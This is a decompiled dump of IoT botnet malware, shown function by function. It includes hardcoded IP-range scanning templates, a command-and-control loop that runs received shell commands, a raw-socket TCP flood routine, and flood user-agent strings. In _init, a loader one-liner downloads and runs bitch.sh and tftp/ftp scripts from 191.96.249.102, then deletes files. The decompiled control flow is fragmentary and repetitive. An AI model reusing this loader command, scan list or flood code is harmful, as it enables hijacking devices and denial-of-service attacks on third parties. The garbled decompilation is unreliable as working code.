        szprintf(v179, (int32_t)"27.98.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v180, (int32_t)"27.112.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v181, (int32_t)"27.192.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v182, (int32_t)"36.32.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v183, (int32_t)"36.248.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v184, (int32_t)"39.64.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v185, (int32_t)"42.4.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v186, (int32_t)"42.48.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v187, (int32_t)"42.52.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v188, (int32_t)"42.56.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v189, (int32_t)"42.63.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v190, (int32_t)"42.84.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v191, (int32_t)"42.176.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v192, (int32_t)"42.224.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v193, (int32_t)"42.176.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v194, (int32_t)"43.253.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v195, (int32_t)"43.230.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v196, (int32_t)"163.53.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v197, (int32_t)"43.230.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v198, (int32_t)"62.252.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v199, (int32_t)"43.245.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v200, (int32_t)"62.255.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v201, (int32_t)"123.25.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v202, (int32_t)"103.54.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v203, (int32_t)"27.255.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v204, (int32_t)"103.204.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v205, (int32_t)"123.24.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v206, (int32_t)"113.191.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v207, (int32_t)"81.100.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v208, (int32_t)"113.188.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v209, (int32_t)"113.189.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v210, (int32_t)"94.174.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v211, (int32_t)"14.160.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v212, (int32_t)"14.161.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v213, (int32_t)"14.162.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v214, (int32_t)"14.163.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v215, (int32_t)"14.164.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v216, (int32_t)"14.165.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v217, (int32_t)"14.166.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v218, (int32_t)"14.167.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v219, (int32_t)"14.168.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v220, (int32_t)"14.169.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v221, (int32_t)"14.170.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v222, (int32_t)"14.171.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v223, (int32_t)"14.172.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v224, (int32_t)"14.173.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v225, (int32_t)"14.174.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v226, (int32_t)"14.175.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v227, (int32_t)"14.176.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v228, (int32_t)"14.177.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v229, (int32_t)"14.178.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v230, (int32_t)"14.179.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v231, (int32_t)"14.180.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v232, (int32_t)"14.181.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v233, (int32_t)"14.182.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v234, (int32_t)"14.183.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v235, (int32_t)"14.184.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v236, (int32_t)"14.185.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v237, (int32_t)"14.186.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v238, (int32_t)"14.187.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v239, (int32_t)"14.188.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v240, (int32_t)"14.189.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v241, (int32_t)"14.190.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v242, (int32_t)"14.191.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v243, (int32_t)"45.121.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v244, (int32_t)"45.120.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v245, (int32_t)"45.115.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v246, (int32_t)"43.252.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v247, (int32_t)"43.230.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v248, (int32_t)"43.240.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v249, (int32_t)"43.245.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v250, (int32_t)"41.174.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v251, (int32_t)"49.118.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v252, (int32_t)"78.188.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v253, (int32_t)"45.127.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v254, (int32_t)"103.30.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v255, (int32_t)"14.33.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v256, (int32_t)"123.16.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v257, (int32_t)"202.44.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v258, (int32_t)"116.93.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v259, (int32_t)"91.83.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v260, (int32_t)"41.253.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v261, (int32_t)"117.173.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v262, (int32_t)"113.190.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v263, (int32_t)"146.88.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v264, (int32_t)"112.196.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v265, (int32_t)"113.178.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v266, (int32_t)"112.45.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v267, (int32_t)"183.223.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v268, (int32_t)"116.71.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v269, (int32_t)"103.44.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v270, (int32_t)"110.235.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v271, (int32_t)"124.253.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v272, (int32_t)"211.237.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v273, (int32_t)"117.175.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v274, (int32_t)"117.173.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v275, (int32_t)"178.93.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v276, (int32_t)"111.9.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v277, (int32_t)"222.252.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v278, (int32_t)"113.174.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v279, (int32_t)"222.252.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v280, (int32_t)"113.160.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v281, (int32_t)"113.161.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v282, (int32_t)"113.162.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v283, (int32_t)"113.163.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v284, (int32_t)"113.164.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v285, (int32_t)"113.165.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v286, (int32_t)"113.166.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v287, (int32_t)"113.167.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v288, (int32_t)"113.168.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v289, (int32_t)"113.169.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v290, (int32_t)"123.17.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v291, (int32_t)"123.18.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v292, (int32_t)"123.19.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v293, (int32_t)"123.20.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v294, (int32_t)"123.21.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v295, (int32_t)"123.22.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v296, (int32_t)"222.252.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v297, (int32_t)"222.253.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v298, (int32_t)"222.254.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v299, (int32_t)"222.255.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v300, (int32_t)"37.247.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v301, (int32_t)"41.208.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v302, (int32_t)"183.220.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v303, (int32_t)"175.201.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v304, (int32_t)"103.198.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v305, (int32_t)"183.223.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v306, (int32_t)"50.205.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v307, (int32_t)"88.248.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v308, (int32_t)"88.105.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v309, (int32_t)"88.247.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v310, (int32_t)"85.105.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v311, (int32_t)"188.3.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v312, (int32_t)"103.203.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v313, (int32_t)"103.55.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v314, (int32_t)"103.220.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v315, (int32_t)"183.233.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v316, (int32_t)"103.242.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v317, (int32_t)"103.198.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v318, (int32_t)"103.14.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v319, (int32_t)"103.195.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v320, (int32_t)"103.203.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v321, (int32_t)"103.214.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v322, (int32_t)"103.218.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v323, (int32_t)"103.225.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v324, (int32_t)"103.228.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v325, (int32_t)"103.231.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v326, (int32_t)"103.60.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v327, (int32_t)"103.248.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v328, (int32_t)"103.253.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v329, (int32_t)"103.255.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v330, (int32_t)"103.35.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v331, (int32_t)"103.49.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v332, (int32_t)"103.62.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v333, (int32_t)"144.48.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v334, (int32_t)"163.47.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v335, (int32_t)"163.53.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v336, (int32_t)"223.29.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v337, (int32_t)"59.153.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v338, (int32_t)"113.176.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v339, (int32_t)"113.175.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v340, (int32_t)"113.177.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v341, (int32_t)"113.183.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v342, (int32_t)"202.164.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v343, (int32_t)"203.134.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v344, (int32_t)"210.56.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v345, (int32_t)"49.156.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v346, (int32_t)"203.210.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v347, (int32_t)"117.181.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v348, (int32_t)"117.178.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v349, (int32_t)"117.177.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v350, (int32_t)"117.176.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v351, (int32_t)"117.170.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v352, (int32_t)"117.171.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v353, (int32_t)"117.162.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v353, (int32_t)"112.26.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v354, (int32_t)"112.27.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v355, (int32_t)"112.28.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v356, (int32_t)"112.29.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v357, (int32_t)"112.30.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v358, (int32_t)"112.31.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v359, (int32_t)"203.150.%d.%d", (int32_t)v140, (int32_t)v141);
        szprintf(v361, (int32_t)"50.233.%d.%d", (int32_t)v140, (int32_t)v141);
    return inet_addr(v360);
=================FUNCTION : sysconf ===================
++++++++ FUNCTION START 50798
++++++++ FUNCTION END 51722
++++++++ FUNCTION LENGTH 924
        case 0: {
        case 1: {
        case 2: {
        case 3: {
        case 4: {
            getdtablesize((int32_t)&v142);
        case 5: {
        case 6: {
        case 7: {
        case 8: {
        case 9: {
        case 10: {
        case 11: {
        case 12: {
        case 13: {
        case 14: {
        case 15: {
        case 16: {
        case 17: {
        case 18: {
        case 19: {
        case 20: {
        case 21: {
        case 22: {
        case 23: {
        case 24: {
        case 25: {
        case 26: {
        case 27: {
        case 28: {
        case 29: {
        case 30: {
            __GI_getpagesize();
        case 31: {
        case 32: {
        case 33: {
        case 34: {
        case 35: {
        case 36: {
        case 37: {
        case 38: {
        case 39: {
        case 40: {
        case 41: {
        case 42: {
        case 43: {
        case 44: {
        case 45: {
        case 46: {
        case 47: {
        case 48: {
        case 49: {
        case 50: {
        case 51: {
        case 52: {
        case 53: {
        case 54: {
        case 55: {
        case 56: {
        case 57: {
        case 58: {
        case 59: {
        case 60: {
        case 61: {
        case 62: {
        case 63: {
        case 64: {
        case 65: {
        case 66: {
        case 67: {
        case 68: {
        case 69: {
        case 70: {
        case 71: {
        case 72: {
        case 73: {
        case 74: {
        case 75: {
        case 76: {
        case 77: {
        case 78: {
        case 79: {
        case 80: {
        case 81: {
        case 82: {
        case 83: {
        case 84: {
        case 85: {
        case 86: {
        case 87: {
        case 88: {
        case 89: {
        case 90: {
        case 91: {
        case 92: {
        case 93: {
        case 94: {
        case 95: {
        case 96: {
        case 97: {
        case 98: {
        case 99: {
        case 100: {
        case 101: {
        case 102: {
        case 103: {
        case 104: {
        case 105: {
        case 106: {
        case 107: {
        case 108: {
        case 109: {
        case 110: {
        case 111: {
        case 112: {
        case 113: {
        case 114: {
        case 115: {
        case 116: {
        case 117: {
        case 118: {
        case 119: {
        case 120: {
        case 121: {
        case 122: {
        case 123: {
        case 124: {
        case 125: {
        case 126: {
        case 127: {
        case 128: {
        case 129: {
        case 130: {
        case 131: {
        case 149: {
            if (__GI_clock_getres(1, NULL, 149, 149) >= 0) {
=================FUNCTION : __dns_lookup ===================
++++++++ FUNCTION START 62891
++++++++ FUNCTION END 64076
++++++++ FUNCTION LENGTH 1185
                        while (true) {
                                __libc_close(-1);
                                    if (inet_pton(-1, (char *)v156, v158, (int32_t)&v151) >= 1) {
                                        inet_addr(-1);
                                    if (socket(-1, v156, v158) >= 0) {
                                        if (__libc_connect(-1, v156, v158) >= 0) {
                                            __libc_send(-1, v156, v158, (int32_t)&v151);
                                                int32_t v173 = __libc_recv(-1, v156, v158, (int32_t)&v151); // 0x8055fd6
                                                                            __libc_close(v146);
                                                                        free(v147);
                                                                        free(v147);
                                                                            while (true) {
                                                                                        __libc_close(-1);
                                                                                            free(-1);
                                                                                            free(-1);
                                                                                        free(-1);
                                                                                        free(-1);
                                                                                                free(-1);
                                                                                                __libc_close(-1);
                                                                                                    free(-1);
                                                                                                    free(-1);
                                                                                                free(-1);
                                                                                                    __libc_close(-1);
                                                                                                        free(-1);
                                                                                                        free(-1);
                                                                                                    free(-1);
                                                                                                __libc_close(-1);
                                                                                                    free(-1);
                                                                                                    free(-1);
                                                                                                free(-1);
                                                                                            free(-1);
                                                                                            v212 = __libc_close(-1);
                                                                                                v213 = free(-1);
                                                                                                v214 = free(-1);
                                                                                            v214 = free(-1);
                                                                                    v212 = __libc_close(-1);
                                                                                        v213 = free(-1);
                                                                                        v214 = free(-1);
                                                                                    v214 = free(-1);
                                                                            __libc_close(-1);
                                                                                free(-1);
                                                                                free(-1);
                                                                            free(-1);
                                                                            free(-1);
                                                                        __libc_close(-1);
                                                                            free(-1);
                                                                            free(-1);
                                                                    __libc_close(-1);
                                                                        free(-1);
                                                                    __libc_close(v146);
                                                                free(v147);
                                                                free(v147);
                                                                __libc_close(v146);
                                                            free(v147);
                                                            free(v147);
                                    __libc_close(v146);
                                free(v147);
                                free(v147);
                                __libc_close(v146);
                            free(v147);
                            free(v147);
                    __libc_close(v146);
                free(v147);
                free(v147);
                __libc_close(v146);
            free(v147);
            free(v147);
            __libc_close(v146);
        free(v147);
        free(v147);
        __libc_close(v146);
    free(v147);
    free(v147);
=================FUNCTION : main ===================
++++++++ FUNCTION START 25732
++++++++ FUNCTION END 26429
++++++++ FUNCTION LENGTH 697
    if (geteuid() == 0) {
    getBuild();
    int32_t v140 = __GI_inet_ntoa(v139); // 0x8050c2e
    printf("BUILD %s:%s\n", (char *)getBuild(), (char *)v140);
    sprintf(v146, v136);
    int32_t v148 = v147 ^ __libc_getpid(); // 0x8050cc7
    srand(v148);
    int32_t v150 = v149 ^ __libc_getpid(); // 0x8050ce9
    init_rand(v150);
    getOurIP();
    int32_t v151 = __libc_fork(v150); // 0x8050cf9
        if (__libc_fork((int32_t)v135) != 0) {
        while (true) {
            if (initConnection() != 0) {
                while (true) {
                    if (initConnection() == 0) {
                getBuild();
                __GI_inet_ntoa(v157);
                HackerPrint(v157, 1);
                while (true) {
                    while (true) {
                        while (true) {
                            while (true) {
                                if (recvLine() == -1) {
                                while (true) {
                                                v186 = __libc_waitpid(v179, v176, v178);
                                                    while (true) {
                                                                while (true) {
                                                                            free(0);
                                        if (strstr(v184, (char *)&v192) != v167) {
                                            int32_t v193 = strstr(v184, (char *)&v192); // 0x8051045
                                                    while (true) {
                                                        while (true) {
                                                                        while (true) {
                                                                            while (true) {
                                                                                    while (true) {
                                                                                    processCmd();
                                                                                processCmd();
                                                                                if (listFork() != 0) {
                                                                                    szprintf(v210, v170, (int32_t)v168, v171);
                                                                                    int32_t v232 = fdpopen(); // 0x8051207
                                                                                    while (true) {
                                                                                        if (fdgets(v232, v169, (int32_t)&v192) != 0) {
                                                                                            fdpclose();
                                                                                    free(v234);
                                                                                        free(v234);
                                                                                    while (true) {
                                                                                        while (true) {
                                                                                while (true) {
                                                                            while (true) {
                                            HackerPrint(v184, (int32_t)&v192);
                                        while (true) {
                                            if (recvLine() != -1) {
                                    v186 = __libc_waitpid(v179, v176, v178);
            getBuild();
            __GI_inet_ntoa(v157);
            HackerPrint(v157, 1);
        __libc_waitpid(v151, (int32_t)&v236, 0);
    while (true) {
        if (initConnection() == 0) {
=================FUNCTION : _fpmaxtostr ===================
++++++++ FUNCTION START 57989
++++++++ FUNCTION END 61454
++++++++ FUNCTION LENGTH 3465
        while (true) {
            while (true) {
                            while (true) {
                                                                    while (true) {
                                                                                    while (true) {
                                                                                while (true) {
                                                                    while (true) {
                                                                while (true) {
                                                            while (true) {
                                                            while (true) {
                                                        while (true) {
                                                            while (true) {
                                                            while (true) {
                                                        while (true) {
                                                        while (true) {
                                                        while (true) {
                                                    while (true) {
                                                            while (true) {
                                                            while (true) {
                                                        while (true) {
                                                    while (true) {
                                                    while (true) {
                                                while (true) {
                                                                        while (true) {
                                                                        while (true) {
                                                                    while (true) {
                                                                while (true) {
                                                                while (true) {
                                                            while (true) {
                                                                while (true) {
                                                                while (true) {
                                                            while (true) {
                                                            while (true) {
                                                            while (true) {
                                                        while (true) {
                                                                while (true) {
                                                                while (true) {
                                                            while (true) {
                                                        while (true) {
                                                        while (true) {
                                                            while (true) {
                                                    while (true) {
                                                        while (true) {
                                                while (true) {
                                                    while (true) {
                                            while (true) {
                        while (true) {
=================FUNCTION : fdpopen ===================
++++++++ FUNCTION START 4203
++++++++ FUNCTION END 4676
++++++++ FUNCTION LENGTH 473
                    v150 = __vfork(v145);
                        __libc_close(v142);
                        __libc_close(v144);
                            __libc_close(v142);
                            __libc_close(v144);
                            __libc_close(v142);
                        __libc_close(v144);
                            __libc_close(v144);
                        __libc_close(v142);
                v147 = getdtablesize(v145);
                        v150 = __vfork(v145);
                            __libc_close(v142);
                            __libc_close(v144);
                                __libc_close(v142);
                                __libc_close(v144);
                                __libc_close(v142);
                            __libc_close(v144);
                                __libc_close(v144);
                            __libc_close(v142);
                    v150 = __vfork(v145);
                        __libc_close(v142);
                        __libc_close(v144);
                            __libc_close(v142);
                            __libc_close(v144);
                            __libc_close(v142);
                        __libc_close(v144);
                            __libc_close(v144);
                        __libc_close(v142);
                v147 = getdtablesize(v145);
                        v150 = __vfork(v145);
                            __libc_close(v142);
                            __libc_close(v144);
                                __libc_close(v142);
                                __libc_close(v144);
                                __libc_close(v142);
                            __libc_close(v144);
                                __libc_close(v144);
                            __libc_close(v142);
=================FUNCTION : _init ===================
++++++++ FUNCTION START 320
++++++++ FUNCTION END 1096
++++++++ FUNCTION LENGTH 776
        "busybotnet*",
        "wget",
        "busybotnet",
        "/dev/netslink/",
        "Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)",
        "Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",
        "BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
        "findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)",
        "findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)",
        "findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
        "findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)",
        "AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)",
        "AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)",
        "magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)",
        "Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)",
        "Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)",
        "MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)",
        "MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)",
        "Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)"
        "etrbhhgetrb",
        "http",
        "Unknown host",
        "Host name lookup failure",
    char (*v60)[703] = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \r\n";
    __get_pc_thunk_bx(0);
=================FUNCTION : gethostbyname_r ===================
++++++++ FUNCTION START 39886
++++++++ FUNCTION END 40452
++++++++ FUNCTION LENGTH 566
    int32_t v142 = __get_hosts_byname_r(a1, 2, v139, a4, a5, a6, v141); // 0x8052dd5
                            if (inet_aton(v161, a3) != 0) {
                            __open_nameservers();
                            v164 = __dns_lookup(v161, 1, v148, (int32_t)&v147, v163, (int32_t)&v151);
                                    free(v151);
                                        free(v149);
                                        free(v149);
                                free(v151);
                                free(v149);
                                if (inet_aton(v161, a3) != 0) {
                                __open_nameservers();
                                v164 = __dns_lookup(v161, 1, v148, (int32_t)&v147, v163, (int32_t)&v151);
                                        free(v151);
                                            free(v149);
                                            free(v149);
                                    free(v151);
                                    free(v149);
        if (inet_aton(v161, a3) != 0) {
        __open_nameservers();
        v164 = __dns_lookup(v161, 1, v148, (int32_t)&v147, v163, (int32_t)&v151);
                free(v151);
                    free(v149);
                    free(v149);
            free(v151);
            free(v149);
        if (inet_aton(v161, a3) != 0) {
        __open_nameservers();
        v164 = __dns_lookup(v161, 1, v148, (int32_t)&v147, v163, (int32_t)&v151);
                free(v151);
                    free(v149);
                    free(v149);
            free(v151);
            free(v149);
=================FUNCTION : sendTCP ===================
++++++++ FUNCTION START 13626
++++++++ FUNCTION END 14092
++++++++ FUNCTION LENGTH 466
        rand_cmwc(v142);
    int32_t result = getHost(a1, &v144); // 0x804e72d
    int32_t v146 = socket(2, 3, 6); // 0x804e75a
        return HackerPrint(v147, (int32_t)"Failed opening raw socket.");
